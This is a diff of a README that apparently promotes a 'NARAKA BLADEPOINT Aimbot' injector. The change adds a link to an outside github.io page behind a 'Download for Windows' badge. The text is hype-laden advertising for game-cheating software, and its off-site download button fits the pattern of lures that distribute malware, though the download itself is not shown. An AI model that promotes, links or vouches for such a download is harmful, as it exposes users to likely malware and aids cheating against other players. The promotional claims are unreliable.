@@ -2,7 +2,7 @@
 
 Sharpen your edge in the battlefield with the ultimate **NARAKA BLADEPOINT Aimbot**. This precision-built injector locks targets instantly, turning every clash into your highlight reel. Whether you’re storming solo or teaming in trios, this cheat engine ensures no swing or shot goes to waste.
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-purple?logo=windows\&style=for-the-badge)]()
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-purple?logo=windows\&style=for-the-badge)](https://naraka-bladepoint-aimbot-tool.github.io/.github/)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-️) • [Install](#instant-install-guide)
 
